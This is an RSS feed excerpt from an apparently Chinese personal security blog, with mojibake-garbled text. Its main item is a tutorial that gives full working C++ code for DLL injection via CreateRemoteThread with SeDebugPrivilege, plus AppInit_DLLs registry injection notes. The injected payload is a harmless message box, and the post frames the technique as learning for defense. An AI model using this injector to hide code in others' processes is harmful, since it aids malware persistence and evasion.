<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Boris&#39;s Blog</title>
        <link>https://id-none.github.io/</link>
        <description>Recent content on Boris&#39;s Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-CN</language>
        <lastBuildDate>Thu, 29 Aug 2024 17:26:06 +0800</lastBuildDate><atom:link href="https://id-none.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>DLLæ³¨å…¥</title>
        <link>https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/</link>
        <pubDate>Thu, 29 Aug 2024 17:26:06 +0800</pubDate>
        
        <guid>https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/</guid>
        <description>&lt;img src="https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829171930019.png" alt="Featured image of post DLLæ³¨å…¥" /&gt;&lt;h1 id=&#34;1-ä»‹ç»&#34;&gt;1. ä»‹ç»
&lt;/h1&gt;&lt;p&gt;DLLæ³¨å…¥æŒ‡çš„æ˜¯å‘è¿è¡Œä¸­çš„å…¶ä»–è¿›ç¨‹å¼ºåˆ¶æ’å…¥ç‰¹å®šçš„DLLæ–‡ä»¶ã€‚ä»æŠ€æœ¯ç»†èŠ‚æ¥è¯´ï¼ŒDLLæ³¨å…¥å‘½ä»¤å…¶ä»–è¿›ç¨‹è‡ªè¡Œè°ƒç”¨LoadLibrary() API,åŠ è½½ï¼ˆLoadingï¼‰ç”¨æˆ·æŒ‡å®šçš„DLLæ–‡ä»¶ã€‚DLLæ³¨å…¥ä¸ä¸€èˆ¬DLLåŠ è½½çš„åŒºåˆ«åœ¨äºï¼ŒåŠ è½½çš„ç›®æ ‡è¿›ç¨‹æ˜¯å…¶è‡ªèº«æˆ–å…¶ä»–è¿›ç¨‹ã€‚ä¸‹å›¾æè¿°äº†DLLæ³¨å…¥çš„æ¦‚å¿µã€‚&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 116; 
			flex-basis: 279px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829171930019.png&#34; data-size=&#34;2000x1720&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829171930019.png&#34;
			width=&#34;2000&#34;
			height=&#34;1720&#34;
			srcset=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829171930019_hu14773067095575877703.png 480w, https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829171930019_hu14856352527106178973.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œmyhack.dllå·²è¢«å¼ºåˆ¶æ’å…¥notepadè¿›ç¨‹ï¼ˆæœ¬æ¥notepadå¹¶ä¸ä¼šåŠ è½½myhack.dll ï¼‰ã€‚åŠ è½½åˆ°notepad.exeè¿›ç¨‹ä¸­çš„myhack.dllä¸å·²ç»åŠ è½½åˆ°notepad.exeè¿›ç¨‹ä¸­çš„DLLï¼ˆkemel32.dllã€user32.dllï¼‰ â€”æ ·ï¼Œæ‹¥æœ‰è®¿é—®notepad.exeè¿›ç¨‹å†…å­˜çš„ï¼ˆæ­£å½“çš„ï¼‰æƒé™ï¼Œè¿™æ ·ç”¨æˆ·å°±å¯ä»¥åšä»»ä½•æƒ³åšçš„äº‹äº†ï¼ˆæ¯”å¦‚ï¼šå‘notepadæ·»åŠ é€šä¿¡åŠŸèƒ½ä»¥å®ç°Messengerã€æ–‡æœ¬ç½‘ç»œæµè§ˆå™¨ç­‰ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;DLLè¢«åŠ è½½åˆ°è¿›ç¨‹åä¼šè‡ªåŠ¨è¿è¡ŒDllMain()å‡½æ•°ï¼Œç”¨æˆ·å¯ä»¥æŠŠæƒ³æ‰§è¡Œçš„ä»£ç æ”¾åˆ°DllMain()å‡½æ•°ï¼Œæ¯å½“åŠ è½½DLLæ—¶ï¼Œæ·»åŠ çš„ä»£ç å°±ä¼šè‡ªç„¶è€Œç„¶å¾—åˆ°æ‰§è¡Œã€‚åˆ©ç”¨è¯¥ç‰¹æ€§å¯ä¿®å¤ç¨‹åºBug,æˆ–å‘ç¨‹åºæ·»åŠ æ–°åŠŸèƒ½ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-jsx&#34;&gt;DLLï¼ˆDynamic Linked Libraryï¼ŒåŠ¨æ€é“¾æ¥åº“ï¼‰è¢«åŠ è½½åˆ°è¿›ç¨‹åä¼šè‡ªåŠ¨è¿è¡ŒDllMain()å‡½æ•°ï¼Œç”¨æˆ·å¯ä»¥æŠŠæƒ³æ‰§è¡Œçš„ä»£ç æ”¾åˆ°DllMain()å‡½æ•°ï¼Œæ¯å½“åŠ è½½DLLæ—¶ï¼Œæ·»åŠ çš„ä»£ç å°±ä¼šè‡ªç„¶è€Œç„¶å¾—åˆ°æ‰§è¡Œã€‚åˆ©ç”¨è¯¥ç‰¹æ€§å¯ä¿®å¤ç¨‹åºBug,æˆ–å‘ç¨‹åºæ·»åŠ æ–°åŠŸèƒ½ã€‚
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
{
    switch( dwReason )
    {
        case DLL_PROCESS_ATTACH:
            // æ·»åŠ æƒ³æ‰§è¡Œçš„ä»£ç 
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;	
        case DLL_PROCESS_DETACH:
            break;	
    }

    return TRUE;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;2-dllæ³¨å…¥ç¤ºä¾‹&#34;&gt;2. DLLæ³¨å…¥ç¤ºä¾‹
&lt;/h1&gt;&lt;p&gt;ä½¿ç”¨LoadLibrary() APIåŠ è½½æŸä¸ªDLLæ—¶ï¼Œè¯¥DLLä¸­çš„DllMain()å‡½æ•°å°±ä¼šè¢«è°ƒç”¨æ‰§è¡Œã€‚DLLæ³¨å…¥çš„å·¥ä½œåŸç†å°±æ˜¯ä»å¤–éƒ¨ä¿ƒä½¿ç›®æ ‡è¿›ç¨‹è°ƒç”¨LoadLibrary() API ï¼ˆä¸ä¸€èˆ¬DLLåŠ è½½ç›¸åŒï¼‰ï¼Œæ‰€ä»¥ä¼šå¼ºåˆ¶è°ƒç”¨æ‰§è¡ŒDLLçš„DllMain()å‡½æ•°ã€‚å¹¶ä¸”ï¼Œè¢«æ³¨å…¥çš„DLLæ‹¥æœ‰ç›®æ ‡è¿›ç¨‹å†…å­˜çš„è®¿é—®æƒé™ï¼Œç”¨æˆ·å¯ä»¥éšæ„æ“ä½œï¼ˆä¿®å¤Bugã€æ·»åŠ åŠŸèƒ½ç­‰ï¼‰ã€‚ä¸‹é¢çœ‹ä¸€äº›ä½¿ç”¨DLLæ³¨å…¥æŠ€æœ¯çš„ç¤ºä¾‹ã€‚&lt;/p&gt;
&lt;h2 id=&#34;21-æ”¹å–„åŠŸèƒ½ä¸ä¿®å¤bug&#34;&gt;2.1 &lt;strong&gt;æ”¹å–„åŠŸèƒ½ä¸ä¿®å¤Bug&lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;DLLæ³¨å…¥æŠ€æœ¯å¯ç”¨äºæ”¹å–„åŠŸèƒ½ä¸ä¿®å¤Bugã€‚æ²¡æœ‰ç¨‹åºå¯¹åº”çš„æºç ï¼Œæˆ–ç›´æ¥ä¿®æ”¹ç¨‹åºæ¯”è¾ƒå›°éš¾æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨DLLæ³¨å…¥æŠ€æœ¯ä¸ºç¨‹åºæ·»åŠ æ–°åŠŸèƒ½ï¼ˆç±»ä¼¼äºæ’ä»¶ï¼‰ï¼Œæˆ–è€…ä¿®æ”¹æœ‰é—®é¢˜çš„ä»£ç ã€æ•°æ®ã€‚&lt;/p&gt;
&lt;h2 id=&#34;22-æ¶ˆæ¯é’©å–&#34;&gt;2.2 &lt;strong&gt;æ¶ˆæ¯é’©å–&lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;Windows OSé»˜è®¤æä¾›çš„æ¶ˆæ¯é’©å–åŠŸèƒ½åº”ç”¨çš„å°±æ˜¯ä¸€ç§DLLæ³¨å…¥æŠ€æœ¯ã€‚ä¸å¸¸è§„çš„DLLæ³¨å…¥å”¯ä¸€çš„åŒºåˆ«æ˜¯ï¼ŒOSä¼šç›´æ¥å°†å·²æ³¨å†Œçš„é’©å–DLLæ³¨å…¥ç›®æ ‡è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;h2 id=&#34;23-api-é’©å–&#34;&gt;2.3 &lt;strong&gt;API é’©å–&lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;APIé’©å–å¹¿æ³›åº”ç”¨äºå®é™…çš„é¡¹ç›®å¼€å‘ï¼Œè€Œè¿›è¡ŒAPIé’©å–æ—¶ç»å¸¸ä½¿ç”¨DLLæ³¨å…¥æŠ€æœ¯ã€‚å…ˆåˆ›å»ºå¥½DLLå½¢æ€çš„é’©å–å‡½æ•°ï¼Œå†å°†å…¶è½»æ¾æ³¨å…¥è¦é’©å–çš„ç›®æ ‡è¿›ç¨‹ï¼Œè¿™æ ·å°±å®Œæˆäº†APIé’©å–ã€‚è¿™çµæ´»è¿ç”¨äº† â€œè¢«æ³¨å…¥çš„DLLæ‹¥æœ‰ç›®æ ‡è¿›ç¨‹å†…å­˜è®¿é—®æƒé™â€è¿™ä¸€ç‰¹æ€§&lt;/p&gt;
&lt;h2 id=&#34;24-å…¶ä»–åº”ç”¨ç¨‹åº&#34;&gt;2.4 &lt;strong&gt;å…¶ä»–åº”ç”¨ç¨‹åº&lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;DLLæ³¨å…¥æŠ€æœ¯ä¹Ÿåº”ç”¨äºç›‘è§†ã€ç®¡ç†PCç”¨æˆ·çš„åº”ç”¨ç¨‹åºã€‚æ¯”å¦‚ï¼Œç”¨æ¥é˜»æ­¢ç‰¹å®šç¨‹åºï¼ˆåƒæ¸¸æˆã€è‚¡ç¥¨äº¤æ˜“ç­‰ï¼‰è¿è¡Œã€ç¦æ­¢è®¿é—®æœ‰å®³ç½‘ç«™ï¼Œä»¥åŠç›‘è§†PCçš„ä½¿ç”¨ç­‰ã€‚ç®¡ç†å‘˜ï¼ˆæˆ–è€…çˆ¶æ¯ï¼‰ä¸»è¦å®‰è£…è¿™ç±»æ‹¦æˆª/é˜»æ–­åº”ç”¨ç¨‹åºæ¥ç®¡ç†/ç›‘è§†ã€‚å—ç®¡ç†/ç›‘è§†çš„ä¸€æ–¹å½“ç„¶åƒæ–¹ç™¾è®¡åœ°æƒ³å…³é—­è¿™äº›ç›‘è§†ç¨‹åºï¼Œä½†ç”±äºè¿™äº›ç›‘è§†ç¨‹åºé‡‡ç”¨DLLæ³¨å…¥æŠ€æœ¯ï¼Œå®ƒä»¬å¯ä»¥éšè—åœ¨æ­£å¸¸è¿›ç¨‹ä¸­è¿è¡Œï¼Œæ‰€ä»¥ç®¡ç†å‘˜ä¸€èˆ¬ä¸ç”¨æ‹…å¿ƒè¢«å‘ç°æˆ–è¢«ç»ˆæ­¢ï¼ˆè‹¥ç”¨æˆ·å¼ºåˆ¶ç»ˆæ­¢Windowsç³»ç»Ÿè¿›ç¨‹ï¼Œä¹Ÿä¼šä¸€å¹¶å…³é—­ç³»ç»Ÿï¼Œæœ€åä¹Ÿç®—è¾¾æˆäº†æ‹¦æˆª/é˜»æ–­è¿™ä¸€ç›®æ ‡ï¼‰ã€‚&lt;/p&gt;
&lt;h2 id=&#34;25-æ¶æ„ä»£ç &#34;&gt;2.5 &lt;strong&gt;æ¶æ„ä»£ç &lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;æ¶æ„ä»£ç åˆ¶ä½œè€…ä»¬æ˜¯ä¸ä¼šç½®è¿™ä¹ˆå¥½çš„æŠ€æœ¯äºä¸é¡¾çš„ï¼Œä»–ä»¬ç§¯æåœ°æŠŠDLLæ³¨å…¥æŠ€æœ¯è¿ç”¨åˆ°è‡ªå·±åˆ¶ä½œçš„æ¶æ„ä»£ç ä¸­ã€‚è¿™äº›å…¥æŠŠè‡ªå·±ç¼–å†™çš„æ¶æ„ä»£ç éšè—åˆ°æ­£å¸¸è¿›ç¨‹ï¼ˆwinlogon.exeã€services.exeã€svchost.exeã€explorer.exeç­‰ï¼‰ï¼Œæ‰“å¼€åé—¨ç«¯å£ï¼ˆ Backdoor port ï¼‰ï¼Œå°è¯•ä»å¤–éƒ¨è¿æ¥ï¼Œæˆ–é€šè¿‡é”®ç›˜å·å½•ï¼ˆKeyloggingï¼‰åŠŸèƒ½å°†ç”¨æˆ·çš„ä¸ªå…¥ä¿¡æ¯ç›—èµ°ã€‚åªæœ‰äº†è§£æ¶æ„ä»£ç åˆ¶ä½œè€…ä»¬ä½¿ç”¨çš„æ‰‹æ³•ï¼Œæ‰èƒ½æ‹¿å‡ºç›¸åº”å¯¹ç­–&lt;/p&gt;
&lt;h1 id=&#34;3-dllæ³¨å…¥çš„å®ç°æ–¹æ³•&#34;&gt;3. DLLæ³¨å…¥çš„å®ç°æ–¹æ³•
&lt;/h1&gt;&lt;p&gt;å‘æŸä¸ªè¿›ç¨‹æ³¨å…¥DLLæ—¶ä¸»è¦ä½¿ç”¨ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;åˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼ˆCreateRemoteThread() API)&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨æ³¨å†Œè¡¨ï¼ˆAppInit_DLLså€¼ï¼‰&lt;/li&gt;
&lt;li&gt;æ¶ˆæ¯é’©å–ï¼ˆSetWindowsHookEx() APIï¼‰&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;31-ä½¿ç”¨createremotethreadå‡½æ•°è¿›è¡Œdllæ³¨å…¥&#34;&gt;3.1 &lt;strong&gt;ä½¿ç”¨CreateRemoteThread()å‡½æ•°è¿›è¡ŒDLLæ³¨å…¥&lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;å°†DLL1.dllæ³¨å…¥åˆ°notepad.exeè¿›ç¨‹ä¸­,æŸ¥çœ‹PIDä¸º4644&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ç®¡ç†å‘˜æ‰“å¼€cmdï¼Œç„¶åè¿›è¡Œdllæ³¨å…¥&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;sudo .\\DLLæ³¨å…¥.exe 4644 C:\\Users\\xxxxx\\Desktop\\æ¶æ„ä»£ç åˆ†æ\\è¿›ç¨‹æ³¨å…¥\\Dll1\\x64\\Debug\\Dll1.dll
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 136; 
			flex-basis: 327px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172029324.png&#34; data-size=&#34;2000x1466&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172029324.png&#34;
			width=&#34;2000&#34;
			height=&#34;1466&#34;
			srcset=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172029324_hu6560594509309568958.png 480w, https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172029324_hu9576281290531800719.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 155; 
			flex-basis: 372px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172112660.png&#34; data-size=&#34;2000x1289&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172112660.png&#34;
			width=&#34;2000&#34;
			height=&#34;1289&#34;
			srcset=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172112660_hu1419743597050033716.png 480w, https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172112660_hu13128667236335850262.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;// DLL1.dll
#include &amp;quot;windows.h&amp;quot;
#include &amp;quot;tchar.h&amp;quot;
#include &amp;quot;pch.h&amp;quot;

#pragma comment(lib, &amp;quot;urlmon.lib&amp;quot;)

HMODULE g_hMod = NULL;

DWORD WINAPI ThreadProc(LPVOID lParam)
{
	// å¼¹çª—â€œHello World!â€
	MessageBox(NULL, L&amp;quot;Hello World!&amp;quot;, L&amp;quot;Message&amp;quot;, MB_OK);
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    HANDLE hThread = NULL;

    g_hMod = (HMODULE)hinstDLL;

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH: 	//åŠ è½½æ—¶
        OutputDebugString(L&amp;quot;Injection!!!&amp;quot;); //è¾“å‡ºè°ƒè¯•å­—ç¬¦ä¸²
        hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); //åˆ›å»ºçº¿ç¨‹
        CloseHandle(hThread);
        break;
    }

    return TRUE;
}
// DLLæ³¨å…¥.cpp
#include &amp;quot;windows.h&amp;quot;
#include &amp;quot;tchar.h&amp;quot;

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    TOKEN_PRIVILEGES tp;
    HANDLE hToken;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &amp;amp;hToken))
    {
        _tprintf(L&amp;quot;OpenProcessToken error: %u\\n&amp;quot;, GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL,           // lookup privilege on local system
        lpszPrivilege,  // privilege to lookup 
        &amp;amp;luid))        // receives LUID of privilege
    {
        _tprintf(L&amp;quot;LookupPrivilegeValue error: %u\\n&amp;quot;, GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.
    if (!AdjustTokenPrivileges(hToken,
        FALSE,
        &amp;amp;tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        _tprintf(L&amp;quot;AdjustTokenPrivileges error: %u\\n&amp;quot;, GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        _tprintf(L&amp;quot;The token does not have the specified privilege. \\n&amp;quot;);
        return FALSE;
    }

    return TRUE;
}

BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)
{
    HANDLE hProcess = NULL, hThread = NULL;
    HMODULE hMod = NULL;
    LPVOID pRemoteBuf = NULL;
    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
    LPTHREAD_START_ROUTINE pThreadProc;

    // #1. ä½¿ç”¨ dwPID è·å–ç›®æ ‡è¿›ç¨‹(notepad.exe)å¥æŸ„ï¼ˆPROCESS_ALL_ACCESSæƒé™ï¼‰ï¼Œç„¶åå°±å¯ä»¥ç”¨ hProcess æ§åˆ¶è¿›ç¨‹.
    if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))
    {        //OpenProcessè°ƒç”¨APIï¼Œå€ŸåŠ©PIDè·å–ç›®æ ‡æƒé™
        _tprintf(L&amp;quot;OpenProcess(%d) failed!!! [%d]\\n&amp;quot;, dwPID, GetLastError());
        return FALSE;
    }

    // #2. åœ¨ç›®æ ‡è¿›ç¨‹(notepad.exe) å†…å­˜ä¸­åˆ†é… szDllName å¤§å°çš„å†…å­˜ï¼Œè¿”å› pRemoteBuf ä½œä¸ºè¯¥ç¼“å†²åŒºçš„åœ°å€.
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);

    // #3. å°† myhack.dll è·¯å¾„å†™å…¥åˆšåˆšåˆ†é…çš„ç¼“å†²åŒº.
    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);

    // #4. è·å– LoadLibraryW() API åœ°å€ï¼Œkernel32.dllåœ¨æ¯ä¸ªè¿›ç¨‹ä¸­çš„åŠ è½½åœ°å€ç›¸åŒï¼ˆè¿™ä¸ªç‰¹æ€§å°±æ˜¯æˆ‘ä»¬è¦åˆ©ç”¨çš„ï¼‰.
    hMod = GetModuleHandle(L&amp;quot;kernel32.dll&amp;quot;);
    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &amp;quot;LoadLibraryW&amp;quot;);

    // #5. åœ¨ notepad.exe ä¸­è¿è¡Œçº¿ç¨‹
    hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
}

int _tmain(int argc, TCHAR* argv[])
{
    if (argc != 3)
    {
        _tprintf(L&amp;quot;USAGE : %s &amp;lt;pid&amp;gt; &amp;lt;dll_path&amp;gt;\\n&amp;quot;, argv[0]);
        return 1;
    }

    // change privilege
    if (!SetPrivilege(SE_DEBUG_NAME, TRUE))
        return 1;

    // inject dll
    if (InjectDll((DWORD)_tstol(argv[1]), argv[2]))
        _tprintf(L&amp;quot;InjectDll(\\&amp;quot;%s\\&amp;quot;) success!!!\\n&amp;quot;, argv[2]);
    else
        _tprintf(L&amp;quot;InjectDll(\\&amp;quot;%s\\&amp;quot;) failed!!!\\n&amp;quot;, argv[2]);

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;32-ä½¿ç”¨æ³¨å†Œè¡¨ä¿®æ”¹appinit_dllså®ç°æ³¨å…¥bios-secure-boot-å·²ç¦ç”¨&#34;&gt;3.2 ä½¿ç”¨æ³¨å†Œè¡¨ä¿®æ”¹AppInit_DLLså®ç°æ³¨å…¥ï¼ˆbios secure boot å·²ç¦ç”¨ï¼‰
&lt;/h2&gt;&lt;p&gt;è¿›è¡ŒDLLæ³¨å…¥çš„ç¬¬äºŒç§æ–¹æ³•æ˜¯ä½¿ç”¨æ³¨å†Œè¡¨ï¼ŒWindowsOSçš„æ³¨å†Œè¡¨ä¸­é»˜è®¤æä¾›äº†AppInit_DLLsä¸LoadAppInit_DLLsä¸¤ä¸ªæ³¨å†Œè¡¨é¡¹&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 147; 
			flex-basis: 352px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172131742.png&#34; data-size=&#34;2000x1360&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172131742.png&#34;
			width=&#34;2000&#34;
			height=&#34;1360&#34;
			srcset=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172131742_hu18446517459900913616.png 480w, https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172131742_hu8547679298402043282.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;åªè¦å°†è¦æ³¨å…¥DLLçš„è·¯å¾„å†™å…¥AppInit_DLLsé¡¹ç›®ï¼Œå¹¶åœ¨LoadAppInit_DLLsä¸­è®¾ç½®å€¼ä¸º1ï¼Œé‡å¯æ—¶ï¼Œç³»ç»Ÿå°±ä¼šå°†æŒ‡å®šçš„DLLæ³¨å…¥åˆ°æ‰€æœ‰è¿è¡Œè¿›ç¨‹ä¸­ã€‚ä¸»è¦åŸç†æ˜¯User32.dllè¢«åŠ è½½åˆ°è¿›ç¨‹æ—¶ï¼Œä¼šè¯»å–AppInit_DLLsæ³¨å†Œè¡¨é¡¹ï¼Œè‹¥å€¼ä¸º1ï¼Œå°±è°ƒç”¨LoadLibrary()å‡½æ•°åŠ è½½ç”¨æˆ·DLLã€‚æ‰€ä»¥ä¸¥æ ¼æ¥è¯´ï¼Œæ˜¯å°†æ³¨å…¥DLLåŠ è½½åˆ°ä½¿ç”¨user32.dllçš„è¿›ç¨‹ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;æ³¨ï¼šWindows XPä¼šå¿½ç•¥LoadAppInit_DLLsæ³¨å†Œè¡¨é¡¹ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;// å¼€å¯secure bootåçš„æ“ä½œ
ä½¿ç”¨IDAæ‰“å¼€Kernel32.dll æŸ¥çœ‹å‡½æ•°LoadAppInitDllsImplementation
void LoadAppInitDllsImplementation()
{
  struct _PEB *v0; // rax
  int v1; // [rsp+50h] [rbp+10h] BYREF
  DWORD pcbData; // [rsp+58h] [rbp+18h] BYREF
  int pvData; // [rsp+60h] [rbp+20h] BYREF
  HKEY hkey; // [rsp+68h] [rbp+28h] BYREF

  if ( !MEMORY[0x7FFE02EC] )
  {
    v0 = NtCurrentPeb();
    if ( (v0-&amp;gt;BitField &amp;amp; 2) == 0
      &amp;amp;&amp;amp; ((v0-&amp;gt;BitField &amp;amp; 0x10) == 0 &amp;amp;&amp;amp; MEMORY[0x7FFE02F0] &amp;gt;= 0 || (unsigned int)BasepIsTestSigningEnabled())
      &amp;amp;&amp;amp; (!(unsigned int)BasepIsServiceSidBlocked(&amp;amp;v1) || !v1)
      &amp;amp;&amp;amp; (!(unsigned int)BasepAreExtensionPointsBlocked(&amp;amp;v1) || !v1)
      &amp;amp;&amp;amp; !RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            L&amp;quot;Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows&amp;quot;,
            0,
            0x20019u,
            &amp;amp;hkey) )
    {
      pcbData = 4;
      if ( !RegGetValueW(hkey, 0i64, L&amp;quot;LoadAppInit_DLLs&amp;quot;, 0x10u, 0i64, &amp;amp;pvData, &amp;amp;pcbData) )
      {
        if ( pvData )
          BasepLoadAppInitDlls(hkey);
      }
      RegCloseKey(hkey);
    }
  }
}

__int64 BasepIsTestSigningEnabled()
{
  unsigned int v0; // ebx
  __int64 SystemInformation; // [rsp+30h] [rbp+8h] BYREF

  v0 = 0;
  SystemInformation = 8i64;
  if ( NtQuerySystemInformation(MaxSystemInfoClass|SystemProcessInformation, &amp;amp;SystemInformation, 8u, 0i64) &amp;gt;= 0
    &amp;amp;&amp;amp; (SystemInformation &amp;amp; 0x200000000i64) != 0 )
  {
    return 1;
  }
  return v0;
}

//   if ( NtQuerySystemInformation(MaxSystemInfoClass|SystemProcessInformation, &amp;amp;SystemInformation, 8u, 0i64) &amp;gt;= 0 &amp;amp;&amp;amp; (SystemInformation &amp;amp; 0x200000000i64) != 0 ) åˆ¤æ–­æ˜¯å¦ä¸ºçœŸ

0x2ä¸º CODEINTEGRITY_OPTION_TESTSIGNã€‚è¿™ä¸ªæ ‡å¿—å¯ä»¥åœ¨bcdeditä¸­è®¾ç½®ï¼Œå‘½ä»¤ä¸º bcdedit.exe â€“set testsigning onï¼Œç”¨äºè®¾ç½®ç³»ç»Ÿçš„test mode
ä½†æ˜¯secure bootåªæœ‰disableä¹‹åæ‰èƒ½ä½¿ç”¨bcdeditè®¾ç½®è¿™ä¸ªFlagã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é‚£ä¹ˆæˆ‘åœ¨è¿™ä¸ªæ³¨å†Œè¡¨ä¸­æ³¨å…¥DLL1.dllï¼Œå¯åŠ¨ç•Œé¢å¼¹å‡ºå¥½å¤šä¸ªâ€Hello Worldâ€œ ğŸ¤£&lt;/p&gt;
</description>
        </item>
        <item>
        <title>UPXè„±å£³åˆæ¢(x64dbg)</title>
        <link>https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/</link>
        <pubDate>Thu, 27 Jun 2024 13:26:06 +0800</pubDate>
        
        <guid>https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/</guid>
        <description>&lt;img src="https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133422309.png" alt="Featured image of post UPXè„±å£³åˆæ¢(x64dbg)" /&gt;&lt;h1 id=&#34;1-target-ç¨‹åº&#34;&gt;1. Target ç¨‹åº
&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://9unkk.github.io//Download/Basic/CRACKME.7z&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
